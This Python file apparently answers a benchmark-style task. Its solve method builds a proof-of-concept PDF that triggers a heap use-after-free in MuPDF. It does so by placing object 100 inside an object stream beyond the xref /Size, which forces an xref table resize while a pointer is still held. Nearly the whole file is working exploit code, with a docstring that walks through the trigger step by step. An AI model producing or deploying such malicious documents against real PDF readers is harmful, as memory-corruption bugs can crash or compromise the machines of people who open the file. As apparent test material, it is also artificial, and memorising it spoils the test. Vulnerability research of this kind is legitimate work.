import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in MuPDF.
        
        The strategy is to create a PDF with an Object Stream (ObjStm).
        Inside the ObjStm, we declare an object ID (100) that is significantly larger 
        than the declared /Size (7) in the XRef stream.
        
        When the target object (Obj 5) inside the ObjStm is accessed:
        1. pdf_cache_object(5) is called, holding a pointer to xref[5].
        2. It sees Obj 5 is compressed in Obj 4, so it recursively loads Obj 4.
        3. pdf_load_obj_stm(4) parses the ObjStm header.
        4. It encounters the entry for Obj 100.
        5. Since 100 >= current xref size (7), it triggers a resize of the xref table.
        6. The memory backing xref[5] is freed/moved.
        7. Recursion returns.
        8. pdf_cache_object(5) uses the now-dangling pointer to xref[5], causing UAF.
        """
        
        pdf = b"%PDF-1.5\n"
        
        # Object 1: Catalog
        # References Obj 5 as the Pages dictionary.
        # This ensures Obj 5 is loaded when the document is opened.
        o1_data = b"<< /Type /Catalog /Pages 5 0 R >>"
        o1 = b"1 0 obj\n" + o1_data + b"\nendobj\n"
        
        # Object 2: Page
        # Basic page object referenced by the Pages dictionary.
        o2_data = b"<< /Type /Page /Parent 5 0 R /MediaBox [0 0 600 600] >>"
        o2 = b"2 0 obj\n" + o2_data + b"\nendobj\n"
        
        # Object 4: Object Stream
        # Contains Obj 5 and Obj 100.
        # Obj 5 content: The Pages dictionary.
        o5_content = b"<< /Type /Pages /Kids [2 0 R] /Count 1 >>"
        # Obj 100 content: Dummy object.
        o100_content = b"null"
        
        # Stream Directory: Pairs of (ObjectNumber, Offset)
        # Obj 5 is at offset 0.
        # Obj 100 is at offset 50 (Trigger for resize).
        pairs = b"5 0 100 50 "
        first_offset = len(pairs)
        
        # Pad content to ensure Obj 100 is effectively at offset 50
        # Obj 5 starts at 0. length is len(o5_content).
        # We need next object at 50.
        current_len = len(o5_content)
        pad_len = 50 - current_len
        padding = b" " * pad_len
        
        stm_body = pairs + o5_content + padding + o100_content
        
        o4_dict = f"<< /Type /ObjStm /N 2 /First {first_offset} /Length {len(stm_body)} >>".encode()
        o4 = b"4 0 obj\n" + o4_dict + b"\nstream\n" + stm_body + b"\nendstream\nendobj\n"
        
        # Calculate offsets for the XRef table
        off1 = len(pdf)
        pdf += o1
        off2 = len(pdf)
        pdf += o2
        off4 = len(pdf)
        pdf += o4
        
        off6 = len(pdf)
        
        # Object 6: XRef Stream
        # /Size 7 means valid indices are 0..6.
        # We define entries for 0, 1, 2, 4, 5, 6.
        # Obj 100 is implicitly defined in ObjStm 4 but not here.
        
        # XRef Stream Format: /W [ 1 2 1 ]
        def p16(x): return x.to_bytes(2, 'big')
        
        # Entry 0: Free
        row0 = b'\x00\x00\x00\xff'
        # Entry 1: Type 1 (Offset), Refers to o1
        row1 = b'\x01' + p16(off1) + b'\x00'
        # Entry 2: Type 1 (Offset), Refers to o2
        row2 = b'\x01' + p16(off2) + b'\x00'
        # Entry 3: Free (Unused)
        row3 = b'\x00\x00\x00\xff'
        # Entry 4: Type 1 (Offset), Refers to o4 (ObjStm)
        row4 = b'\x01' + p16(off4) + b'\x00'
        # Entry 5: Type 2 (Compressed), In ObjStm 4, Index 0
        row5 = b'\x02' + p16(4) + b'\x00'
        # Entry 6: Type 1 (Offset), Refers to o6 (XRef)
        row6 = b'\x01' + p16(off6) + b'\x00'
        
        xref_stm = row0 + row1 + row2 + row3 + row4 + row5 + row6
        
        o6_dict = f"<< /Type /XRef /Size 7 /W [ 1 2 1 ] /Root 1 0 R /Length {len(xref_stm)} >>".encode()
        o6 = b"6 0 obj\n" + o6_dict + b"\nstream\n" + xref_stm + b"\nendstream\nendobj\n"
        
        pdf += o6
        
        # Trailer pointing to XRef Stream
        trailer = b"\nstartxref\n" + str(off6).encode() + b"\n%%EOF"
        pdf += trailer
        
        return pdf